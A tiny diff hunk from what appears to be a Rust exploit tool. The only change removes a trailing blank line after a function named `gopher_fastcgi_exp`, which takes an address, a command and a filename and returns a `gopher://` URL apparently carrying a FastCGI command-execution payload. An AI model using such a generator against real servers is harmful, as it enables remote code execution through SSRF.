@@ -33,4 +33,3 @@ pub fn gopher_fastcgi_exp(addr: &str, cmd: &str, filename: &str) -> Result<Strin
 
     Ok(format!("gopher://{addr}/_{payload}"))
 }
-
